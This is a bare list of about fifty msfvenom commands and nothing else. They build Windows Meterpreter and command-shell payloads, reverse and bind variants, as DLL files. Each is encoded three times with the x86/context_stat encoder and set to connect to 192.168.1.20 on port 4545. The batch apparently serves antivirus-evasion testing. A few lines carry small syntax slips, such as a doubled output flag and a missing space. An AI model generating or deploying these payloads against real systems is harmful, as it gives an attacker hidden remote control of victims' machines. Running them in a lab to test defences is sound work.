sudo  msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/Meterpreter_reverse_tcp_x86_context_stat_i3_.dll
sudo  msfvenom -p windows/meterpreter/reverse_https lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/Meterpreter_reverse_https_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter/bind_hidden_tcp ahost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/Meterpreter_bind_hidden_tcp_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter/bind_ipv6_tcp ahost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/Meterpreter_bind_ipv6_tcp_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter/bind_ipv6_tcp_uuid lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/Meterpreter_bind_ipv6_tcp_uuid_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter/bind_nonx_tcp lhost=192.168.1.20 lport=4545 -f dll -o -e x86/context_stat -i3 -o /home/kali/exe/Meterpreter_bind_nonx_tcp_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter/bind_tcp rhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/Meterpreter_bind_tcp_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter/bind_tcp_rc4 rhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/Meterpreter_bind_tcp_rc4_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter/bind_tcp_uuid rhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/Meterpreter_bind_tcp_uuid_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter/reverse_hop_http lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/Meterpreter_reverse_hop_http_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter/reverse_http lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/Meterpreter_reverse_http_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter/reverse_http_proxy_pstore lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/Meterpreter_reverse_http_proxy_pstore_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter/reverse_https_proxy lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/Meterpreter_reverse_https_proxy_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter/reverse_ipv6_tcp lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/Meterpreter_reverse_ipv6_tcp_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter/reverse_nonx_tcp lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/Meterpreter_reverse_nonx_tcp_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter/reverse_tcp_allports lhost=192.168.1.20 -f dll -e x86/context_stat -i3 -o /home/kali/exe/Meterpreter_reverse_tcp_allports_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter/reverse_tcp_dns lhost=192.168.1.20 -f dll -e x86/context_stat -i3 -o /home/kali/exe/Meterpreter_reverse_tcp_dns_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter/reverse_tcp_rc4 lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/Meterpreter_reverse_tcp_rc4_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter/reverse_tcp_rc4_dns lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/Meterpreter_reverse_tcp_rc4_dns_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter/reverse_winhttp lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/Meterpreter_reverse_winhttp_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter/reverse_winhttps lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/Meterpreter_reverse_winhttps_x86_context_stat_i3.dll
sudo  msfvenom -p windows/shell/bind_ipv6_tcp rhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/shell_bind_ipv6_tcp_x86_context_stat_i3.dll
sudo  msfvenom -p windows/shell/bind_ipv6_tcp_uuid rhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/shell_bind_ipv6_tcp_uuid_x86_context_stat_i3.dll
sudo  msfvenom -p windows/shell/bind_nonx_tcp rhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/shell_bind_nonx_tcp_x86_context_stat_i3.dll
sudo  msfvenom -p windows/shell/bind_tcp rhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/shell_bind_tcp_x86_context_stat_i3.dll
sudo  msfvenom -p windows/shell/bind_tcp_rc4 rhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/shell_bind_tcp_rc4_x86_context_stat_i3.dll
sudo  msfvenom -p windows/shell/bind_tcp_uuid rhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/shell_bind_tcp_uuid_x86_context_stat_i3.dll
sudo  msfvenom -pwindows/shell/reverse_ipv6_tcp lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/shell_reverse_ipv6_tcp_x86_context_stat_i3.dll
sudo  msfvenom -p windows/shell/reverse_nonx_tcp lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/shell_reverse_nonx_tcp_x86_context_stat_i3.dll
sudo  msfvenom -p windows/shell/reverse_ord_tcp lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/shell_reverse_ord_tcp_x86_context_stat_i3.dll
sudo  msfvenom -p windows/shell/reverse_tcp lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/shell_reverse_tcp_x86_context_stat_i3.dll
sudo  msfvenom -p windows/shell/reverse_tcp_allports lhost=192.168.1.20 -f dll -e x86/context_stat -i3 -o /home/kali/exe/shell_reverse_tcp_allports_x86_context_stat_i3.dll
sudo  msfvenom -p windows/shell/reverse_tcp_rc4 lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/shell_reverse_tcp_rc4_x86_context_stat_i3.dll
sudo  msfvenom -p windows/shell/reverse_tcp_dns lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/shell_reverse_tcp_dns_x86_context_stat_i3.dll
sudo  msfvenom -p windows/shell/reverse_tcp_rc4_dns lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/shell_reverse_tcp_rc4_dns_x86_context_stat_i3.dll
sudo  msfvenom -p windows/shell/reverse_tcp_uuid lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/shell_reverse_tcp_uuid_x86_context_stat_i3.dll
sudo  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/x64_shell_reverse_tcp_x86_context_stat_i3.dll
sudo  msfvenom -p windows/x64/shell_bind_tcp rhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/x64_shell_bind_tcp_x86_context_stat_i3.dll
sudo  msfvenom -p windows/x64/shell/reverse_tcp_uuid lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/x64_shell_reverse_tcp_uuid_x86_context_stat_i3.dll
sudo  msfvenom -p  windows/x64/shell/reverse_tcp lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/x64_single_reverse_tcp_x86_context_stat_i3.dll
sudo  msfvenom -p  windows/x64/shell/bind_tcp_uuid lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/single_x64_shell_bind_tcp_uuid_x86_context_stat_i3.dll
sudo  msfvenom -p  windows/x64/shell/bind_tcp rhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/single _shell_bind_tcp_x86_context_stat_i3.dll
sudo  msfvenom -p  windows/x64/shell/bind_ipv6_tcp_uuid rhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/x64_shell_bind_ipv6_tcp_uuid_x86_context_stat_i3.dll
sudo  msfvenom -p  windows/x64/shell/bind_ipv6_tcp rhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/x64_shell_bind_ipv6_tcp_x86_context_stat_i3.dll
sudo  msfvenom -p  windows/x64/meterpreter_bind_tcp rhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/x64_meterpreter_bind_tcp_x86_context_stat_i3.dll
sudo  msfvenom -p  windows/x64/meterpreter_reverse_http lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/x64_meterpreter_reverse_http_x86_context_stat_i3.dll
sudo  msfvenom -p  windows/x64/meterpreter_reverse_https lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/x64_meterpreter_reverse_https_x86_context_stat_i3.dll
sudo  msfvenom -p  windows/x64/meterpreter_reverse_ipv6_tcp lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/x64_meterpreter_reverse_ipv6_tcp_x86_context_stat_i3.dll
sudo  msfvenom -p  windows/x64/meterpreter_reverse_tcp lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/x64_meterpreter_reverse_tcp_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter_reverse_http lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/x64_single_meterpreter_reverse_http_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter_reverse_https lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/single_meterpreter_reverse_https_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter_reverse_ipv6_tcp lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/single_meterpreter_reverse_ipv6_tcp_x86_context_stat_i3.dll
sudo  msfvenom -p windows/meterpreter_bind_tcp  lhost=192.168.1.20 lport=4545 -f dll -e x86/context_stat -i3 -o /home/kali/exe/x64_single_meterpreter_bind_tcp_x86_context_stat_i3.dll

